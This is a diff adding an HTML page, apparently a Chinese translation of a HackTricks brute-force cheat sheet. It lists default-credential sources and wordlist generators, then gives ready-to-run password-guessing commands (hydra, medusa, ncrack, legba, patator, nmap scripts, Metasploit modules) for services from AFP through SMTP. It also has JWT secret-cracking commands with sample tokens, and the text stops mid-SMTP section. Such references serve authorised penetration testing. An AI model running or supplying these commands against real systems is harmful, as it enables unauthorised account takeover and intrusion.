@@ -1,0 +1,868 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Brute Force - CheatSheet</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="brute-force---cheatsheet"><a class="header" href="#brute-force---cheatsheet">Brute Force - CheatSheet</a></h1>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=brute-force"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=brute-force" %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="默认凭据"><a class="header" href="#默认凭据">默认凭据</a></h2>
+<p><strong>在谷歌上搜索</strong>所使用技术的默认凭据，或 <strong>尝试以下链接</strong>：</p>
+<ul>
+<li><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet"><strong>https://github.com/ihebski/DefaultCreds-cheat-sheet</strong></a></li>
+<li><a href="http://www.phenoelit.org/dpl/dpl.html"><strong>http://www.phenoelit.org/dpl/dpl.html</strong></a></li>
+<li><a href="http://www.vulnerabilityassessment.co.uk/passwordsC.htm"><strong>http://www.vulnerabilityassessment.co.uk/passwordsC.htm</strong></a></li>
+<li><a href="https://192-168-1-1ip.mobi/default-router-passwords-list/"><strong>https://192-168-1-1ip.mobi/default-router-passwords-list/</strong></a></li>
+<li><a href="https://datarecovery.com/rd/default-passwords/"><strong>https://datarecovery.com/rd/default-passwords/</strong></a></li>
+<li><a href="https://bizuns.com/default-passwords-list"><strong>https://bizuns.com/default-passwords-list</strong></a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv"><strong>https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv</strong></a></li>
+<li><a href="https://github.com/Dormidera/WordList-Compendium"><strong>https://github.com/Dormidera/WordList-Compendium</strong></a></li>
+<li><a href="https://www.cirt.net/passwords"><strong>https://www.cirt.net/passwords</strong></a></li>
+<li><a href="http://www.passwordsdatabase.com"><strong>http://www.passwordsdatabase.com/</strong></a></li>
+<li><a href="https://many-passwords.github.io"><strong>https://many-passwords.github.io/</strong></a></li>
+<li><a href="https://theinfocentric.com/"><strong>https://theinfocentric.com/</strong></a></li>
+</ul>
+<h2 id="创建您自己的字典"><a class="header" href="#创建您自己的字典"><strong>创建您自己的字典</strong></a></h2>
+<p>尽可能多地收集目标的信息并生成自定义字典。可能有帮助的工具：</p>
+<h3 id="crunch"><a class="header" href="#crunch">Crunch</a></h3>
+<pre><code class="language-bash">crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
+crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)
+
+@ Lower case alpha characters
+, Upper case alpha characters
+% Numeric characters
+^ Special characters including spac
+crunch 6 8 -t ,@@^^%%
+</code></pre>
+<h3 id="cewl"><a class="header" href="#cewl">Cewl</a></h3>
+<pre><code class="language-bash">cewl example.com -m 5 -w words.txt
+</code></pre>
+<h3 id="cupp"><a class="header" href="#cupp"><a href="https://github.com/Mebus/cupp">CUPP</a></a></h3>
+<p>根据你对受害者的了解（姓名、日期等）生成密码</p>
+<pre><code>python3 cupp.py -h
+</code></pre>
+<h3 id="wister"><a class="header" href="#wister"><a href="https://github.com/cycurity/wister">Wister</a></a></h3>
+<p>一个单词列表生成工具，允许您提供一组单词，使您能够从给定的单词中制作多个变体，创建一个独特且理想的单词列表，以便针对特定目标使用。</p>
+<pre><code class="language-bash">python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
+
+__          _______  _____ _______ ______ _____
+\ \        / /_   _|/ ____|__   __|  ____|  __ \
+\ \  /\  / /  | | | (___    | |  | |__  | |__) |
+\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
+\  /\  /   _| |_ ____) |  | |  | |____| | \ \
+\/  \/   |_____|_____/   |_|  |______|_|  \_\
+
+Version 1.0.3                    Cycurity
+
+Generating wordlist...
+[########################################] 100%
+Generated 67885 lines.
+
+Finished in 0.920s.
+</code></pre>
+<h3 id="pydictor"><a class="header" href="#pydictor"><a href="https://github.com/LandGrey/pydictor">pydictor</a></a></h3>
+<h3 id="字典列表"><a class="header" href="#字典列表">字典列表</a></h3>
+<ul>
+<li><a href="https://github.com/danielmiessler/SecLists"><strong>https://github.com/danielmiessler/SecLists</strong></a></li>
+<li><a href="https://github.com/Dormidera/WordList-Compendium"><strong>https://github.com/Dormidera/WordList-Compendium</strong></a></li>
+<li><a href="https://github.com/kaonashi-passwords/Kaonashi"><strong>https://github.com/kaonashi-passwords/Kaonashi</strong></a></li>
+<li><a href="https://github.com/google/fuzzing/tree/master/dictionaries"><strong>https://github.com/google/fuzzing/tree/master/dictionaries</strong></a></li>
+<li><a href="https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm"><strong>https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm</strong></a></li>
+<li><a href="https://weakpass.com/wordlist/"><strong>https://weakpass.com/wordlist/</strong></a></li>
+<li><a href="https://wordlists.assetnote.io/"><strong>https://wordlists.assetnote.io/</strong></a></li>
+<li><a href="https://github.com/fssecur3/fuzzlists"><strong>https://github.com/fssecur3/fuzzlists</strong></a></li>
+<li><a href="https://hashkiller.io/listmanager"><strong>https://hashkiller.io/listmanager</strong></a></li>
+<li><a href="https://github.com/Karanxa/Bug-Bounty-Wordlists"><strong>https://github.com/Karanxa/Bug-Bounty-Wordlists</strong></a></li>
+</ul>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+<p><br />
+使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=brute-force"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
+今天就获取访问权限：</p>
+<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=brute-force" %}</p>
+<h2 id="服务"><a class="header" href="#服务">服务</a></h2>
+<p>按服务名称字母顺序排列。</p>
+<h3 id="afp"><a class="header" href="#afp">AFP</a></h3>
+<pre><code class="language-bash">nmap -p 548 --script afp-brute &lt;IP&gt;
+msf&gt; use auxiliary/scanner/afp/afp_login
+msf&gt; set BLANK_PASSWORDS true
+msf&gt; set USER_AS_PASS true
+msf&gt; set PASS_FILE &lt;PATH_PASSWDS&gt;
+msf&gt; set USER_FILE &lt;PATH_USERS&gt;
+msf&gt; run
+</code></pre>
+<h3 id="ajp"><a class="header" href="#ajp">AJP</a></h3>
+<pre><code class="language-bash">nmap --script ajp-brute -p 8009 &lt;IP&gt;
+</code></pre>
+<h2 id="amqp-activemq-rabbitmq-qpid-joram-和-solace"><a class="header" href="#amqp-activemq-rabbitmq-qpid-joram-和-solace">AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM 和 Solace)</a></h2>
+<pre><code class="language-bash">legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
+</code></pre>
+<h3 id="卡桑德拉"><a class="header" href="#卡桑德拉">卡桑德拉</a></h3>
+<pre><code class="language-bash">nmap --script cassandra-brute -p 9160 &lt;IP&gt;
+# legba ScyllaDB / Apache Casandra
+legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
+</code></pre>
+<h3 id="couchdb"><a class="header" href="#couchdb">CouchDB</a></h3>
+<pre><code class="language-bash">msf&gt; use auxiliary/scanner/couchdb/couchdb_login
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+</code></pre>
+<h3 id="docker-注册表"><a class="header" href="#docker-注册表">Docker 注册表</a></h3>
+<pre><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
+</code></pre>
+<h3 id="elasticsearch"><a class="header" href="#elasticsearch">Elasticsearch</a></h3>
+<pre><code>hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
+</code></pre>
+<h3 id="ftp"><a class="header" href="#ftp">FTP</a></h3>
+<pre><code class="language-bash">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ftp
+ncrack -p 21 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ftp
+legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
+</code></pre>
+<h3 id="http-通用暴力破解"><a class="header" href="#http-通用暴力破解">HTTP 通用暴力破解</a></h3>
+<h4 id="wfuzz"><a class="header" href="#wfuzz"><a href="../pentesting-web/web-tool-wfuzz.html"><strong>WFuzz</strong></a></a></h4>
+<h3 id="http-基本认证"><a class="header" href="#http-基本认证">HTTP 基本认证</a></h3>
+<pre><code class="language-bash">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
+# Use https-get mode for https
+medusa -h &lt;IP&gt; -u &lt;username&gt; -P  &lt;passwords.txt&gt; -M  http -m DIR:/path/to/auth -T 10
+legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
+</code></pre>
+<h3 id="http---ntlm"><a class="header" href="#http---ntlm">HTTP - NTLM</a></h3>
+<pre><code class="language-bash">legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+</code></pre>
+<h3 id="http---post-表单"><a class="header" href="#http---post-表单">HTTP - Post 表单</a></h3>
+<pre><code class="language-bash">hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect" -V
+# Use https-post-form mode for https
+</code></pre>
+<p>对于 http<strong>s</strong>，您必须将 "http-post-form" 更改为 "<strong>https-post-form"</strong></p>
+<h3 id="http---cms----wordpress-joomla-或-drupal-或-moodle"><a class="header" href="#http---cms----wordpress-joomla-或-drupal-或-moodle"><strong>HTTP - CMS --</strong> (W)ordpress, (J)oomla 或 (D)rupal 或 (M)oodle</a></h3>
+<pre><code class="language-bash">cmsmap -f W/J/D/M -u a -p a https://wordpress.com
+# Check also https://github.com/evilsocket/legba/wiki/HTTP
+</code></pre>
+<h3 id="imap"><a class="header" href="#imap">IMAP</a></h3>
+<pre><code class="language-bash">hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f &lt;IP&gt; imap -V
+nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;
+legba imap --username user --password data/passwords.txt --target localhost:993
+</code></pre>
+<h3 id="irc"><a class="header" href="#irc">IRC</a></h3>
+<pre><code class="language-bash">nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;
+</code></pre>
+<h3 id="iscsi"><a class="header" href="#iscsi">ISCSI</a></h3>
+<pre><code class="language-bash">nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 &lt;IP&gt;
+</code></pre>
+<h3 id="jwt"><a class="header" href="#jwt">JWT</a></h3>
+<pre><code class="language-bash">#hashcat
+hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
+
+#https://github.com/Sjord/jwtcrack
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+
+#John
+john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
+
+#https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;
+
+#https://github.com/brendan-rius/c-jwt-cracker
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
+
+#https://github.com/mazen160/jwt-pwn
+python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
+
+#https://github.com/lmammino/jwt-cracker
+jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
+</code></pre>
+<h3 id="ldap"><a class="header" href="#ldap">LDAP</a></h3>
+<pre><code class="language-bash">nmap --script ldap-brute -p 389 &lt;IP&gt;
+legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
+</code></pre>
+<h3 id="mqtt"><a class="header" href="#mqtt">MQTT</a></h3>
+<pre><code>ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
+</code></pre>
+<h3 id="mongo"><a class="header" href="#mongo">Mongo</a></h3>
+<pre><code class="language-bash">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
+use auxiliary/scanner/mongodb/mongodb_login
+legba mongodb --target localhost:27017 --username root --password data/passwords.txt
+</code></pre>
+<h3 id="mssql"><a class="header" href="#mssql">MSSQL</a></h3>
+<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a></p>
+<pre><code class="language-shell"># Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+</code></pre>
+<pre><code class="language-bash">legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
+</code></pre>
+<h3 id="mysql"><a class="header" href="#mysql">MySQL</a></h3>
+<pre><code class="language-bash"># hydra
+hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
+
+# msfconsole
+msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
+
+# medusa
+medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql
+
+#Legba
+legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
+</code></pre>
+<h3 id="oraclesql"><a class="header" href="#oraclesql">OracleSQL</a></h3>
+<pre><code class="language-bash">patator oracle_login sid=&lt;SID&gt; host=&lt;IP&gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
+
+./odat.py passwordguesser -s $SERVER -d $SID
+./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
+
+#msf1
+msf&gt; use admin/oracle/oracle_login
+msf&gt; set RHOSTS &lt;IP&gt;
+msf&gt; set RPORT 1521
+msf&gt; set SID &lt;SID&gt;
+
+#msf2, this option uses nmap and it fails sometimes for some reason
+msf&gt; use scanner/oracle/oracle_login
+msf&gt; set RHOSTS &lt;IP&gt;
+msf&gt; set RPORTS 1521
+msf&gt; set SID &lt;SID&gt;
+
+#for some reason nmap fails sometimes when executing this script
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;
+
+legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
+</code></pre>
+<p>为了使用 <strong>oracle_login</strong> 和 <strong>patator</strong>，您需要 <strong>安装</strong>：</p>
+<pre><code class="language-bash">pip3 install cx_Oracle --upgrade
+</code></pre>
+<p><a href="https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force">离线 OracleSQL 哈希暴力破解</a> (<strong>版本 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,</strong> 和 <strong>11.2.0.3</strong>):</p>
+<pre><code class="language-bash">nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
+</code></pre>
+<h3 id="pop"><a class="header" href="#pop">POP</a></h3>
+<pre><code class="language-bash">hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; pop3 -V
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f &lt;IP&gt; pop3 -V
+
+# Insecure
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110
+
+# SSL
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
+</code></pre>
+<h3 id="postgresql"><a class="header" href="#postgresql">PostgreSQL</a></h3>
+<pre><code class="language-bash">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres
+medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
+ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432
+patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
+use auxiliary/scanner/postgres/postgres_login
+nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;
+legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
+</code></pre>
+<h3 id="pptp"><a class="header" href="#pptp">PPTP</a></h3>
+<p>您可以从 <a href="https://http.kali.org/pool/main/t/thc-pptp-bruter/">https://http.kali.org/pool/main/t/thc-pptp-bruter/</a> 下载 <code>.deb</code> 包进行安装。</p>
+<pre><code class="language-bash">sudo dpkg -i thc-pptp-bruter*.deb #Install the package
+cat rockyou.txt | thc-pptp-bruter –u &lt;Username&gt; &lt;IP&gt;
+</code></pre>
+<h3 id="rdp"><a class="header" href="#rdp">RDP</a></h3>
+<pre><code class="language-bash">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;
+hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;
+legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain &lt;RDP_DOMAIN&gt;] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
+</code></pre>
+<h3 id="redis"><a class="header" href="#redis">Redis</a></h3>
+<pre><code class="language-bash">msf&gt; use auxiliary/scanner/redis/redis_login
+nmap --script redis-brute -p 6379 &lt;IP&gt;
+hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default
+legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
+</code></pre>
+<h3 id="rexec"><a class="header" href="#rexec">Rexec</a></h3>
+<pre><code class="language-bash">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V
+</code></pre>
+<h3 id="rlogin"><a class="header" href="#rlogin">Rlogin</a></h3>
+<pre><code class="language-bash">hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V
+</code></pre>
+<h3 id="rsh"><a class="header" href="#rsh">Rsh</a></h3>
+<pre><code class="language-bash">hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V
+</code></pre>
+<p><a href="http://pentestmonkey.net/tools/misc/rsh-grind">http://pentestmonkey.net/tools/misc/rsh-grind</a></p>
+<h3 id="rsync"><a class="header" href="#rsync">Rsync</a></h3>
+<pre><code class="language-bash">nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;
+</code></pre>
+<h3 id="rtsp"><a class="header" href="#rtsp">RTSP</a></h3>
+<pre><code class="language-bash">hydra -l root -P passwords.txt &lt;IP&gt; rtsp
+</code></pre>
+<h3 id="sftp"><a class="header" href="#sftp">SFTP</a></h3>
+<pre><code class="language-bash">legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+</code></pre>
+<h3 id="snmp"><a class="header" href="#snmp">SNMP</a></h3>
+<pre><code class="language-bash">msf&gt; use auxiliary/scanner/snmp/snmp_login
+nmap -sU --script snmp-brute &lt;target&gt; [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]
+onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
+</code></pre>
+<h3 id="smb"><a class="header" href="#smb">SMB</a></h3>
+<pre><code class="language-bash">nmap --script smb-brute -p 445 &lt;IP&gt;
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup &lt;SMB_WORKGROUP&gt;] [--smb-share &lt;SMB_SHARE&gt;]
+</code></pre>
+<h3 id="smtp"><a class="header" href="#smtp">SMTP</a></h3>
+<pre><code class="language-bash">hydra -l &lt;username&gt; -P /path/to/passwords.txt &lt;IP&gt; smtp -V
